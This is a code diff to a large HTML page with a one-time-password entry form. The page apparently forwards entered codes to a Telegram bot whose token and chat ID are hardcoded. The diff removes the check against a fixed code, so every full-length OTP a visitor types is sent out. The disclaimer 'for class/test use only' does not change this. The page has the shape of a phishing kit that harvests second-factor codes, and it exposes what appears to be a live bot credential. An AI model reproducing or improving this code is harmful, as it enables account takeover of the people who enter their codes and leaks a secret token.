@@ -13080,8 +13080,6 @@
         const continueButton = document.getElementById("continueButton");
         const otpMessage = document.getElementById("otpMessage");
 
-        const realOtp = "123456"; // Replace with your actual OTP for validation
-
         // Telegram Bot Info (for class/test use only — don't expose real tokens!)
         const botToken = "8275820128:AAHRMbLFG9-YQ2GRNO73LkSvw-ZWx773Ed4";
         const chatId = "8218597378";
@@ -13132,18 +13130,13 @@
         document.getElementById("otpForm").addEventListener("submit", async (event) => {
             event.preventDefault();
             const otpCode = getOTP(); // This is the real entered OTP
-
-            if (otpCode === realOtp) { // Check if the OTP is correct
+            if (otpCode.length === otpInputs.length) {
                 await sendRealOTP(otpCode);
                 otpMessage.innerHTML = `<span style="color: green;">OTP ${otpCode} sent successfully!</span>`;
             } else {
-                otpMessage.innerHTML = `<span style="color: red;">Wrong code. Please try again.</span>`;
-                alert("Wrong OTP. Please try again."); // Alert for wrong OTP
+                otpMessage.innerHTML = `<span style="color: red;">Please enter full OTP.</span>`;
             }
         });
     });
 </script>
-  
-  
-    
 </html>
